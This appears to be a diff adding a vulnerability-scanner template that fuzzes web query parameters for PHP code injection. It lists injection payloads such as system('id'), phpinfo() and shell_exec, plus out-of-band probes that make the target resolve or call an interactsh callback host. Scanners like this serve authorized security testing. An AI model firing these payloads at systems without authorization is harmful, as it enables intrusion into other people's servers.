@@ -1,0 +1,63 @@
+id: php-code-injection
+
+info:
+  name: PHP Code Injection
+  author: reewardius
+  reference:
+    - https://4bdoz.medium.com/rce-by-code-injection-perl-reverse-shell-a2e90181b10
+    - https://medium.com/@jonathanbouman/remote-code-execution-at-ws1-aholdusa-com-compromising-logins-of-ahold-delhaize-usa-employees-c7c9aca7e05d
+  severity: critical
+  tags: fuzzing-rce,fuzzing-req
+  
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+      
+    payloads:
+      rce:
+        - "'.system('id').'"
+        - "'.system('perl -v').'"
+        - "%20%7b$%7bphpinfo()%7d%7d"
+        - '<?php exec("id"); ?>'
+        - '<?php system("id"); ?>'
+        - '<?php shell_exec("id"); ?>'
+        - '<?php escapeshellcmd("id"); ?>'
+        - "gethostbyname('{{interactsh-url}}');"
+        - 's:19:"<?php phpinfo(); ?>";'
+        - "$(exec('nslookup {{interactsh-url}}'))"
+        - "${'{{interactsh-url}}'.resolve}"
+        - "${resolve({{'interactsh-url'}})}"
+        - "${dns({{'interactsh-url'}})}"
+        
+    fuzzing:
+      - part: query
+        mode: multiple
+        type: replace
+        fuzz:
+          - "{{rce}}"
+          
+    redirects: true
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "uid="
+          - "gid="
+        condition: and
+          
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
+        
+      - type: word
+        words:
+          - "PHP Version"
+          
+      - type: word
+        words:
+          - "This is perl"
